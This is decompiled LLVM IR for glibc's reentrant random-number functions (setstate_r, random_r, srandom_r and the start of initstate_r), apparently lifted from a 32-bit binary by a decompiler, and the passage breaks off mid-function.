define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_80541cf = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_80541db = add i32 %arg1, 4
  store i32 %v1_80541db, i32* %esi.global-to-local, align 4
  %v1_80541de = add i32 %tmp4, 12
  %v2_80541de = inttoptr i32 %v1_80541de to i32*
  %v3_80541de = load i32, i32* %v2_80541de, align 4
  store i32 %v3_80541de, i32* %ecx.global-to-local, align 4
  %v1_80541e1 = add i32 %tmp4, 8
  %v2_80541e1 = inttoptr i32 %v1_80541e1 to i32*
  %v3_80541e1 = load i32, i32* %v2_80541e1, align 4
  %v1_80541e4 = icmp eq i32 %v3_80541de, 0
  %v1_80541e6 = icmp eq i1 %v1_80541e4, false
  br i1 %v1_80541e6, label %dec_label_pc_80541f1, label %dec_label_pc_80541e8

dec_label_pc_80541e8:                             ; preds = %entry
  %v1_80541e8 = add i32 %v3_80541e1, -4
  %v2_80541e8 = inttoptr i32 %v1_80541e8 to i32*
  store i32 0, i32* %v2_80541e8, align 4
  br label %dec_label_pc_8054201

dec_label_pc_80541f1:                             ; preds = %entry
  %v1_80541f1 = add i32 %tmp4, 4
  %v2_80541f1 = inttoptr i32 %v1_80541f1 to i32*
  %v3_80541f1 = load i32, i32* %v2_80541f1, align 4
  %v2_80541f4 = sub i32 %v3_80541f1, %v3_80541e1
  %v2_80541f6 = sdiv i32 %v2_80541f4, 4
  %v3_80541f9 = mul i32 %v2_80541f6, 5
  %v2_80541fc = add i32 %v3_80541f9, %v3_80541de
  store i32 %v2_80541fc, i32* %eax.global-to-local, align 4
  %v2_80541fe = add i32 %v3_80541e1, -4
  %v3_80541fe = inttoptr i32 %v2_80541fe to i32*
  store i32 %v2_80541fc, i32* %v3_80541fe, align 4
  br label %dec_label_pc_8054201

dec_label_pc_8054201:                             ; preds = %dec_label_pc_80541e8, %dec_label_pc_80541f1
  %v0_8054201 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054201 = add i32 %v0_8054201, -4
  %v2_8054201 = inttoptr i32 %v1_8054201 to i32*
  %v3_8054201 = load i32, i32* %v2_8054201, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8054209 = ashr i32 %v3_8054201, 31
  %v2_805420a = zext i32 %v3_8054201 to i64
  %v4_805420a = zext i32 %v1_8054209 to i64
  %v5_805420a = mul nuw i64 %v4_805420a, 4294967296
  %v6_805420a = or i64 %v5_805420a, %v2_805420a
  %v8_805420a = sdiv i64 %v6_805420a, 5
  %v9_805420a = trunc i64 %v8_805420a to i32
  store i32 %v9_805420a, i32* %eax.global-to-local, align 4
  %v10_805420a = srem i64 %v6_805420a, 5
  %v11_805420a = trunc i64 %v10_805420a to i32
  %v6_805420f = icmp ugt i32 %v11_805420a, 4
  br i1 %v6_805420f, label %dec_label_pc_805424f, label %dec_label_pc_8054211

dec_label_pc_8054211:                             ; preds = %dec_label_pc_8054201
  %v1_8054211 = mul i32 %v11_805420a, 4
  %v2_8054211 = add i32 %v1_8054211, ptrtoint (i32* @global_var_805c294.550 to i32)
  %v3_8054211 = inttoptr i32 %v2_8054211 to i32*
  %v4_8054211 = load i32, i32* %v3_8054211, align 4
  store i32 %v4_8054211, i32* %ecx.global-to-local, align 4
  %v2_8054218 = add i32 %v1_8054211, ptrtoint (i32* @global_var_805c280.551 to i32)
  %v3_8054218 = inttoptr i32 %v2_8054218 to i32*
  %v4_8054218 = load i32, i32* %v3_8054218, align 4
  store i32 %v4_8054218, i32* %ebp.global-to-local, align 4
  %v1_805421f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805421f = add i32 %v1_805421f, 16
  %v3_805421f = inttoptr i32 %v2_805421f to i32*
  store i32 %v4_8054211, i32* %v3_805421f, align 4
  %v0_8054222 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054222 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054222 = add i32 %v1_8054222, 20
  %v3_8054222 = inttoptr i32 %v2_8054222 to i32*
  store i32 %v0_8054222, i32* %v3_8054222, align 4
  %v1_8054225 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054225 = add i32 %v1_8054225, 12
  %v3_8054225 = inttoptr i32 %v2_8054225 to i32*
  store i32 %v11_805420a, i32* %v3_8054225, align 4
  %v1_8054228 = icmp eq i32 %v11_805420a, 0
  br i1 %v1_8054228, label %dec_label_pc_8054242, label %dec_label_pc_805422c

dec_label_pc_805422c:                             ; preds = %dec_label_pc_8054211
  %v0_805422c = load i32, i32* %esi.global-to-local, align 4
  %v1_805422c = add i32 %v0_805422c, -4
  %v2_805422c = inttoptr i32 %v1_805422c to i32*
  %v3_805422c = load i32, i32* %v2_805422c, align 4
  %v1_805422f = ashr i32 %v3_805422c, 31
  %v0_8054230 = load i32, i32* %edi.global-to-local, align 4
  %v2_8054230 = zext i32 %v3_805422c to i64
  %v4_8054230 = zext i32 %v1_805422f to i64
  %v5_8054230 = mul nuw i64 %v4_8054230, 4294967296
  %v6_8054230 = or i64 %v5_8054230, %v2_8054230
  %v7_8054230 = zext i32 %v0_8054230 to i64
  %v8_8054230 = sdiv i64 %v6_8054230, %v7_8054230
  %v9_8054230 = trunc i64 %v8_8054230 to i32
  %v2_8054232 = mul i32 %v9_8054230, 4
  %v3_8054232 = add i32 %v2_8054232, %v0_805422c
  %v1_8054235 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054235 = add i32 %v1_8054235, %v9_8054230
  store i32 %v2_8054235, i32* %eax.global-to-local, align 4
  %v1_8054237 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054237 = add i32 %v1_8054237, 4
  %v3_8054237 = inttoptr i32 %v2_8054237 to i32*
  store i32 %v3_8054232, i32* %v3_8054237, align 4
  %v0_805423a = load i32, i32* %eax.global-to-local, align 4
  %v1_805423a = ashr i32 %v0_805423a, 31
  %v0_805423b = load i32, i32* %ecx.global-to-local, align 4
  %v2_805423b = zext i32 %v0_805423a to i64
  %v4_805423b = zext i32 %v1_805423a to i64
  %v5_805423b = mul nuw i64 %v4_805423b, 4294967296
  %v6_805423b = or i64 %v5_805423b, %v2_805423b
  %v7_805423b = zext i32 %v0_805423b to i64
  %v8_805423b = sdiv i64 %v6_805423b, %v7_805423b
  %v9_805423b = trunc i64 %v8_805423b to i32
  store i32 %v9_805423b, i32* %eax.global-to-local, align 4
  %v10_805423b = srem i64 %v6_805423b, %v7_805423b
  %v11_805423b = trunc i64 %v10_805423b to i32
  %v0_805423d = load i32, i32* %esi.global-to-local, align 4
  %v2_805423d = mul i32 %v11_805423b, 4
  %v3_805423d = add i32 %v2_805423d, %v0_805423d
  %v1_8054240 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054240 = inttoptr i32 %v1_8054240 to i32*
  store i32 %v3_805423d, i32* %v2_8054240, align 4
  br label %dec_label_pc_8054242

dec_label_pc_8054242:                             ; preds = %dec_label_pc_8054211, %dec_label_pc_805422c
  %v0_8054242 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054242 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054242 = mul i32 %v1_8054242, 4
  %v3_8054242 = add i32 %v2_8054242, %v0_8054242
  store i32 %v3_8054242, i32* %eax.global-to-local, align 4
  %v1_8054245 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054245 = add i32 %v1_8054245, 8
  %v3_8054245 = inttoptr i32 %v2_8054245 to i32*
  store i32 %v0_8054242, i32* %v3_8054245, align 4
  %v0_8054248 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054248 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054248 = add i32 %v1_8054248, 24
  %v3_8054248 = inttoptr i32 %v2_8054248 to i32*
  store i32 %v0_8054248, i32* %v3_8054248, align 4
  br label %dec_label_pc_805425d

dec_label_pc_805424f:                             ; preds = %dec_label_pc_8054201
  %v1_805424f = call i32 @__errno_location(i32 %v0_80541cf)
  store i32 %v1_805424f, i32* %eax.global-to-local, align 4
  %v1_8054254 = inttoptr i32 %v1_805424f to i32*
  store i32 22, i32* %v1_8054254, align 4
  br label %dec_label_pc_805425d

dec_label_pc_805425d:                             ; preds = %dec_label_pc_8054242, %dec_label_pc_805424f
  %storemerge = phi i32 [ -1, %dec_label_pc_805424f ], [ 0, %dec_label_pc_8054242 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80541cf, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8054242, { 1, 0 }
  uselistorder i32 %v11_805420a, { 2, 1, 3, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_805425d, { 1, 0 }
  uselistorder label %dec_label_pc_8054242, { 1, 0 }
  uselistorder label %dec_label_pc_8054201, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8054268 = load i32, i32* @ebx, align 4
  store i32 %v0_8054268, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8054271 = add i32 %tmp2, 8
  %v2_8054271 = inttoptr i32 %v1_8054271 to i32*
  %v3_8054271 = load i32, i32* %v2_8054271, align 4
  store i32 %v3_8054271, i32* %esi.global-to-local, align 4
  %v1_8054274 = add i32 %tmp2, 12
  %v2_8054274 = inttoptr i32 %v1_8054274 to i32*
  %v3_8054274 = load i32, i32* %v2_8054274, align 4
  %v4_8054274 = icmp eq i32 %v3_8054274, 0
  %v1_8054278 = icmp eq i1 %v4_8054274, false
  br i1 %v1_8054278, label %dec_label_pc_8054291, label %dec_label_pc_805427a

dec_label_pc_805427a:                             ; preds = %entry
  %v2_805427a = inttoptr i32 %v3_8054271 to i32*
  %v3_805427a = load i32, i32* %v2_805427a, align 4
  %v5_805427a = mul i32 %v3_805427a, 1103515245
  %v1_8054280 = add i32 %v5_805427a, 12345
  %v1_8054285 = urem i32 %v1_8054280, -2147483648
  store i32 %v1_8054285, i32* %eax.global-to-local, align 4
  store i32 %v1_8054285, i32* %v2_805427a, align 4
  %v0_805428c = load i32, i32* %eax.global-to-local, align 4
  %v1_805428c = load i32, i32* %ebp.global-to-local, align 4
  %v2_805428c = inttoptr i32 %v1_805428c to i32*
  store i32 %v0_805428c, i32* %v2_805428c, align 4
  br label %dec_label_pc_80542bd

dec_label_pc_8054291:                             ; preds = %entry
  %v1_8054291 = add i32 %tmp2, 4
  %v2_8054291 = inttoptr i32 %v1_8054291 to i32*
  %v3_8054291 = load i32, i32* %v2_8054291, align 4
  store i32 %v3_8054291, i32* %ecx.global-to-local, align 4
  %v2_8054294 = load i32, i32* %arg1, align 4
  store i32 %v2_8054294, i32* %edx.global-to-local, align 4
  %v1_8054296 = add i32 %tmp2, 24
  %v2_8054296 = inttoptr i32 %v1_8054296 to i32*
  %v3_8054296 = load i32, i32* %v2_8054296, align 4
  store i32 %v3_8054296, i32* %edi.global-to-local, align 4
  %v1_8054299 = inttoptr i32 %v3_8054291 to i32*
  %v2_8054299 = load i32, i32* %v1_8054299, align 4
  store i32 %v2_8054299, i32* %eax.global-to-local, align 4
  %v1_805429b = inttoptr i32 %v2_8054294 to i32*
  %v2_805429b = load i32, i32* %v1_805429b, align 4
  %v4_805429b = add i32 %v2_805429b, %v2_8054299
  store i32 %v4_805429b, i32* %v1_805429b, align 4
  %v0_805429d = load i32, i32* %edx.global-to-local, align 4
  %v1_805429d = inttoptr i32 %v0_805429d to i32*
  %v2_805429d = load i32, i32* %v1_805429d, align 4
  %v1_805429f = add i32 %v0_805429d, 4
  store i32 %v1_805429f, i32* %edx.global-to-local, align 4
  %v2_80542a2 = udiv i32 %v2_805429d, 2
  %v1_80542a4 = load i32, i32* %edi.global-to-local, align 4
  %v7_80542a4 = icmp ult i32 %v1_805429f, %v1_80542a4
  %v1_80542a6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80542a6 = inttoptr i32 %v1_80542a6 to i32*
  store i32 %v2_80542a2, i32* %v2_80542a6, align 4
  %v0_80542a9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80542a9 = add i32 %v0_80542a9, 4
  store i32 %v1_80542a9, i32* %eax.global-to-local, align 4
  br i1 %v7_80542a4, label %dec_label_pc_80542b2, label %dec_label_pc_80542ae

dec_label_pc_80542ae:                             ; preds = %dec_label_pc_8054291
  %v0_80542ae = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_80542ae, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80542b8

dec_label_pc_80542b2:                             ; preds = %dec_label_pc_8054291
  %v1_80542b2 = load i32, i32* %edi.global-to-local, align 4
  %v7_80542b2 = icmp ult i32 %v1_80542a9, %v1_80542b2
  br i1 %v7_80542b2, label %dec_label_pc_80542b8, label %dec_label_pc_80542b6

dec_label_pc_80542b6:                             ; preds = %dec_label_pc_80542b2
  %v0_80542b6 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_80542b6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80542b8

dec_label_pc_80542b8:                             ; preds = %dec_label_pc_80542b2, %dec_label_pc_80542ae, %dec_label_pc_80542b6
  %v0_80542b8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80542b8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542b8 = inttoptr i32 %v1_80542b8 to i32*
  store i32 %v0_80542b8, i32* %v2_80542b8, align 4
  %v0_80542ba = load i32, i32* %eax.global-to-local, align 4
  %v1_80542ba = load i32, i32* %ebx.global-to-local, align 4
  %v2_80542ba = add i32 %v1_80542ba, 4
  %v3_80542ba = inttoptr i32 %v2_80542ba to i32*
  store i32 %v0_80542ba, i32* %v3_80542ba, align 4
  br label %dec_label_pc_80542bd

dec_label_pc_80542bd:                             ; preds = %dec_label_pc_805427a, %dec_label_pc_80542b8
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_80542bf = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80542bf, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8054285, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80542bd, { 1, 0 }
  uselistorder label %dec_label_pc_80542b8, { 2, 0, 1 }
}

define i32 @srandom_r(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_80542c4 = load i32, i32* @ebp, align 4
  %v0_80542c5 = load i32, i32* @edi, align 4
  %v0_80542c6 = load i32, i32* @esi, align 4
  %v0_80542c7 = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_80542d2 = trunc i64 %arg1 to i32
  store i32 %v4_80542d2, i32* %eax.global-to-local, align 4
  %v1_80542d6 = add i32 %arg2, 12
  %v2_80542d6 = inttoptr i32 %v1_80542d6 to i32*
  %v3_80542d6 = load i32, i32* %v2_80542d6, align 4
  store i32 %v3_80542d6, i32* %edx.global-to-local, align 4
  %v6_80542dc = icmp ugt i32 %v3_80542d6, 4
  br i1 %v6_80542dc, label %dec_label_pc_8054350, label %dec_label_pc_80542de

dec_label_pc_80542de:                             ; preds = %entry
  %v1_80542de = add i32 %arg2, 8
  %v2_80542de = inttoptr i32 %v1_80542de to i32*
  %v3_80542de = load i32, i32* %v2_80542de, align 4
  store i32 %v3_80542de, i32* %ebx.global-to-local, align 4
  %v1_80542e1 = icmp eq i32 %v4_80542d2, 0
  %v1_80542e3 = icmp eq i1 %v1_80542e1, false
  br i1 %v1_80542e3, label %dec_label_pc_80542e7, label %dec_label_pc_80542e5

dec_label_pc_80542e5:                             ; preds = %dec_label_pc_80542de
  %v1_80542e5 = and i32 %v4_80542d2, -256
  %v2_80542e5 = or i32 %v1_80542e5, 1
  store i32 %v2_80542e5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80542e7

dec_label_pc_80542e7:                             ; preds = %dec_label_pc_80542de, %dec_label_pc_80542e5
  %v0_80542e7 = phi i32 [ %v4_80542d2, %dec_label_pc_80542de ], [ %v2_80542e5, %dec_label_pc_80542e5 ]
  %v2_80542e7 = inttoptr i32 %v3_80542de to i32*
  store i32 %v0_80542e7, i32* %v2_80542e7, align 4
  %v1_80542e9 = icmp eq i32 %v3_80542d6, 0
  br i1 %v1_80542e9, label %dec_label_pc_805434e, label %dec_label_pc_80542ed

dec_label_pc_80542ed:                             ; preds = %dec_label_pc_80542e7
  %v0_80542ed = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_80542ed, i32* %edx.global-to-local, align 4
  %v0_80542ef = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80542ef, i32* %ecx.global-to-local, align 4
  %v0_80542f1 = load i32, i32* @esi, align 4
  %v1_80542f1 = add i32 %v0_80542f1, 16
  %v2_80542f1 = inttoptr i32 %v1_80542f1 to i32*
  %v3_80542f1 = load i32, i32* %v2_80542f1, align 4
  store i32 %v3_80542f1, i32* %eax.global-to-local, align 4
  %v4_80542f9 = sext i32 %v3_80542f1 to i64
  store i64 %v4_80542f9, i64* %stack_var_-40, align 8
  %v5_805432b27 = icmp sgt i32 %v3_80542f1, 1
  br i1 %v5_805432b27, label %dec_label_pc_80542fe, label %dec_label_pc_805432d

dec_label_pc_80542fe:                             ; preds = %dec_label_pc_80542ed, %dec_label_pc_80542fe.dec_label_pc_80542fe_crit_edge
  %v0_8054322 = phi i32 [ %v0_8054322.pre, %dec_label_pc_80542fe.dec_label_pc_80542fe_crit_edge ], [ %v0_80542ef, %dec_label_pc_80542ed ]
  %v0_80542fe = phi i32 [ %v0_80542fe.pre, %dec_label_pc_80542fe.dec_label_pc_80542fe_crit_edge ], [ %v0_80542ed, %dec_label_pc_80542ed ]
  %v0_805432528 = phi i32 [ %v0_8054328.pre, %dec_label_pc_80542fe.dec_label_pc_80542fe_crit_edge ], [ 1, %dec_label_pc_80542ed ]
  %v1_8054305 = ashr i32 %v0_80542fe, 31
  %v2_8054306 = zext i32 %v0_80542fe to i64
  %v4_8054306 = zext i32 %v1_8054305 to i64
  %v5_8054306 = mul nuw i64 %v4_8054306, 4294967296
  %v6_8054306 = or i64 %v5_8054306, %v2_8054306
  %v8_8054306 = sdiv i64 %v6_8054306, 127773
  %v9_8054306 = trunc i64 %v8_8054306 to i32
  %v10_8054306 = srem i64 %v6_8054306, 127773
  %v3_805430c = mul nsw i64 %v10_8054306, 16807
  %v4_805430c = trunc i64 %v3_805430c to i32
  %v3_8054312 = mul i32 %v9_8054306, 2836
  store i32 %v3_8054312, i32* %eax.global-to-local, align 4
  %v2_8054318 = sub i32 %v4_805430c, %v3_8054312
  %v13_8054318 = icmp slt i32 %v2_8054318, 0
  %v1_805431a = icmp eq i1 %v13_8054318, false
  %v1_805431c = add i32 %v2_8054318, 2147483647
  %v2_8054318.v1_805431c = select i1 %v1_805431a, i32 %v2_8054318, i32 %v1_805431c
  store i32 %v2_8054318.v1_805431c, i32* %edx.global-to-local, align 4
  %v1_8054322 = add i32 %v0_8054322, 4
  store i32 %v1_8054322, i32* %ecx.global-to-local, align 4
  %v1_8054325 = add i32 %v0_805432528, 1
  store i32 %v1_8054325, i32* @edi, align 4
  %v2_8054326 = inttoptr i32 %v1_8054322 to i32*
  store i32 %v2_8054318.v1_805431c, i32* %v2_8054326, align 4
  %v0_8054328.pre = load i32, i32* @edi, align 4
  %v3_8054328.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_8054328.pre to i32
  %v5_805432b = icmp slt i32 %v0_8054328.pre, %extract.t12
  br i1 %v5_805432b, label %dec_label_pc_80542fe.dec_label_pc_80542fe_crit_edge, label %dec_label_pc_8054328.dec_label_pc_805432d_crit_edge

dec_label_pc_80542fe.dec_label_pc_80542fe_crit_edge: ; preds = %dec_label_pc_80542fe
  %v0_80542fe.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_8054322.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80542fe

dec_label_pc_8054328.dec_label_pc_805432d_crit_edge: ; preds = %dec_label_pc_80542fe
  %v0_805432d.pre = load i32, i32* @esi, align 4
  %v0_8054330.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805432d

dec_label_pc_805432d:                             ; preds = %dec_label_pc_8054328.dec_label_pc_805432d_crit_edge, %dec_label_pc_80542ed
  %v0_8054330 = phi i32 [ %v0_8054330.pre, %dec_label_pc_8054328.dec_label_pc_805432d_crit_edge ], [ %v0_80542ef, %dec_label_pc_80542ed ]
  %v0_805432d = phi i32 [ %v0_805432d.pre, %dec_label_pc_8054328.dec_label_pc_805432d_crit_edge ], [ %v0_80542f1, %dec_label_pc_80542ed ]
  %v1_805432d = add i32 %v0_805432d, 20
  %v2_805432d = inttoptr i32 %v1_805432d to i32*
  %v3_805432d = load i32, i32* %v2_805432d, align 4
  store i32 %v3_805432d, i32* %eax.global-to-local, align 4
  %v2_8054330 = add i32 %v0_805432d, 4
  %v3_8054330 = inttoptr i32 %v2_8054330 to i32*
  store i32 %v0_8054330, i32* %v3_8054330, align 4
  %v0_8054333 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054333 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054333 = mul i32 %v1_8054333, 4
  %v3_8054333 = add i32 %v2_8054333, %v0_8054333
  store i32 %v3_8054333, i32* %eax.global-to-local, align 4
  %v1_8054336 = load i32, i32* @esi, align 4
  %v2_8054336 = inttoptr i32 %v1_8054336 to i32*
  store i32 %v3_8054333, i32* %v2_8054336, align 4
  %v3_8054338 = load i64, i64* %stack_var_-40, align 8
  %v6_8054338 = mul nsw i64 %v3_8054338, 10
  %v7_8054338 = trunc i64 %v6_8054338 to i32
  %v2_805433e = ptrtoint i32* %stack_var_-20 to i32
  %v1_805434b24 = add i32 %v7_8054338, -1
  %v9_805434b25 = icmp slt i32 %v1_805434b24, 0
  store i32 %v1_805434b24, i32* @ebx, align 4
  %v1_805434c26 = icmp eq i1 %v9_805434b25, false
  br i1 %v1_805434c26, label %dec_label_pc_805433e, label %dec_label_pc_805434e

dec_label_pc_805433e:                             ; preds = %dec_label_pc_805432d, %dec_label_pc_805433e
  store i32 %v2_805433e, i32* %eax.global-to-local, align 4
  %v0_8054343 = load i32, i32* @esi, align 4
  %v2_8054344 = inttoptr i32 %v0_8054343 to i32*
  %v3_8054344 = call i32 @__GI_random_r(i32* %v2_8054344, i32 %v2_805433e)
  store i32 %v0_8054343, i32* %eax.global-to-local, align 4
  store i32 %v2_805433e, i32* %edx.global-to-local, align 4
  %v0_805434b.pre = load i32, i32* @ebx, align 4
  %v1_805434b = add i32 %v0_805434b.pre, -1
  %v9_805434b = icmp slt i32 %v1_805434b, 0
  store i32 %v1_805434b, i32* @ebx, align 4
  %v1_805434c = icmp eq i1 %v9_805434b, false
  br i1 %v1_805434c, label %dec_label_pc_805433e, label %dec_label_pc_805434e

dec_label_pc_805434e:                             ; preds = %dec_label_pc_805432d, %dec_label_pc_805433e, %dec_label_pc_80542e7
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054350

dec_label_pc_8054350:                             ; preds = %entry, %dec_label_pc_805434e
  %v0_8054353 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_805434e ]
  store i32 %v0_8054353, i32* %eax.global-to-local, align 4
  store i32 %v0_80542c7, i32* @ebx, align 4
  store i32 %v0_80542c6, i32* @esi, align 4
  store i32 %v0_80542c5, i32* @edi, align 4
  store i32 %v0_80542c4, i32* @ebp, align 4
  ret i32 %v0_8054353

; uselistorder directives
  uselistorder i32 %v0_8054353, { 1, 0 }
  uselistorder i32 %v1_805434b, { 1, 0 }
  uselistorder i32 %v0_805432d, { 1, 0 }
  uselistorder i32 %v0_8054328.pre, { 1, 0 }
  uselistorder i32 %v2_8054318.v1_805431c, { 1, 0 }
  uselistorder i32 %v0_80542fe, { 1, 0 }
  uselistorder i32 %v0_80542ef, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8054350, { 1, 0 }
  uselistorder label %dec_label_pc_805434e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805433e, { 1, 0 }
  uselistorder label %dec_label_pc_80542fe, { 1, 0 }
  uselistorder label %dec_label_pc_80542e7, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_805435d = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_805437e, label %dec_label_pc_8054372

dec_label_pc_8054372:                             ; preds = %entry
  %v2_8054372 = icmp ult i32 %arg3, 256
  %v1_8054379 = select i1 %v2_8054372, i32 5, i32 4
  store i32 %v1_8054379, i32* @ebx, align 4
  br label %dec_label_pc_8054394

dec_label_pc_805437e:                             ; preds = %entry
  %v6_8054381 = icmp ugt i32 %arg3, 31
  br i1 %v6_8054381, label %dec_label_pc_805438c, label %dec_label_pc_8054383

dec_label_pc_8054383:                             ; preds = %dec_label_pc_805437e
  store i32 0, i32* @ebx, align 4
  %v6_8054388 = icmp ugt i32 %arg3, 7
  br i1 %v6_8054388, label %dec_label_pc_8054394, label %dec_label_pc_80543e4

dec_label_pc_805438c:                             ; preds = %dec_label_pc_805437e
  %v2_805438c = icmp ult i32 %arg3, 64
  %v1_8054391 = select i1 %v2_805438c, i32 3, i32 2
  store i32 %v1_8054391, i32* @ebx, align 4
  br label %dec_label_pc_8054394

dec_label_pc_8054394:                             ; preds = %dec_label_pc_8054383, %dec_label_pc_8054372, %dec_label_pc_805438c
  %v0_8054394 = phi i32 [ 0, %dec_label_pc_8054383 ], [ %v1_8054379, %dec_label_pc_8054372 ], [ %v1_8054391, %dec_label_pc_805438c ]
  %v1_8054394 = mul nuw nsw i32 %v0_8054394, 4
  %v2_8054394 = add i32 %v1_8054394, ptrtoint (i32* @global_var_805c294.550 to i32)
  %v3_8054394 = inttoptr i32 %v2_8054394 to i32*
  %v4_8054394 = load i32, i32* %v3_8054394, align 4
  store i32 %v4_8054394, i32* %eax.global-to-local, align 4
  %v1_805439b = add i32 %tmp7, 4
  store i32 %v1_805439b, i32* @esi, align 4
  %v2_805439e = add i32 %arg4, 16
  %v3_805439e = inttoptr i32 %v2_805439e to i32*
  store i32 %v4_8054394, i32* %v3_805439e, align 4
  %v0_80543a1 = load i32, i32* @ebx, align 4
  %v1_80543a1 = mul i32 %v0_80543a1, 4
  %v2_80543a1 = add i32 %v1_80543a1, ptrtoint (i32* @global_var_805c280.551 to i32)
  %v3_80543a1 = inttoptr i32 %v2_80543a1 to i32*
  %v4_80543a1 = load i32, i32* %v3_80543a1, align 4
  store i32 %v4_80543a1, i32* %edx.global-to-local, align 4
  %v0_80543a8 = load i32, i32* @esi, align 4
  %v1_80543a8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80543a8 = mul i32 %v1_80543a8, 4
  %v3_80543a8 = add i32 %v2_80543a8, %v0_80543a8
  store i32 %v3_80543a8, i32* %eax.global-to-local, align 4
  %v1_80543ab = load i32, i32* @edi, align 4
  %v2_80543ab = add i32 %v1_80543ab, 12
  %v3_80543ab = inttoptr i32 %v2_80543ab to i32*
  store i32 %v0_80543a1, i32* %v3_80543ab, align 4
  %v0_80543ae = load i32, i32* %edx.global-to-local, align 4
  %v1_80543ae = load i32, i32* @edi, align 4
  %v2_80543ae = add i32 %v1_80543ae, 20
  %v3_80543ae = inttoptr i32 %v2_80543ae to i32*
  store i32 %v0_80543ae, i32* %v3_80543ae, align 4
  %v0_80543b1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80543b1 = load i32, i32* @edi, align 4
  %v2_80543b1 = add i32 %v1_80543b1, 24
